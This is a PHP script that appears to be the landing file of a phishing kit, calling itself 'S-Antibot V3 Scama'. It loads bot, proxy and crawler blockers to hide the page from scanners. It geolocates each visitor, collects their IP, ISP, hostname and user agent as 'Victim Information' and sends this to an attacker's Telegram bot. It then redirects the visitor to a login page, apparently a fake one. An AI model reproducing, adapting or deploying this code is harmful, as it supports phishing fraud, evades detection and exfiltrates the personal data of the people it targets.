<?php error_reporting(0);
require_once 'blocker.php';
require_once 'proxy.php';
require_once 'Country.php';
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_crawlerdetect=$tanitatikaram['crawlerdetect'];
if($setting_crawlerdetect == 'on') {
require_once 'crawlerdetect.php';
}
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$viewsToken = $tanitatikaram['viewsToken'];
$viewsChatID = $tanitatikaram['viewsChatID'];
$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$city = $details['city'];
$isp = $details['isp'];
$region = $details['regionName'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= " @GGLOGSSTORE | Your S-Antibot V3 Scama Getting Visit \n"."\n";
$message .= " -------------- Victim Information-------------- \n"."\n";
$message.= "IP Address:$ip"."\n";
$message.= "COUNTRY:$countryname"."\n";
$message.= "REGION:{$region}"."\n";
$message.= "ORGANISATION:{$isp}"."\n";
$message.= "HOSTNAME:" . $hostname . ""."\n";
$message.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n"."\n";
function callAPI($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($curl);
    curl_close($curl);
}
$result = urlencode($message);
callAPI('https://api.telegram.org/bot' . $viewsToken . '/sendMessage?chat_id=' . $viewsChatID . '&text=' . $result . "&parse_mode=html");
session_start();
$key = substr(sha1(mt_rand()),1,25);
$praga=rand();
$praga=md5($praga);
header("Location: login.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
?>